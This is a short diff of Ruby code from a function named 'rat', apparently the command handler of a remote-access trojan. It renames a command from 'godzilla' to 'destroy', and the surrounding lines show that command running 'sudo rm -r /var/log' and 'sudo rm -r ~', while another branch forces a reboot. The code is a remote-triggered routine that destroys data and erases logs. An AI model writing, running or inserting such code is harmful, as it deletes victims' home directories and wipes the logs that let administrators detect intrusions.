@@ -107,7 +107,7 @@ def rat(ip)
         else
           exec 'sudo reboot'
         end
-      when 'godzilla'
+      when 'destroy'
         system 'sudo rm -r /var/log'
         system 'sudo rm -r ~'
       end
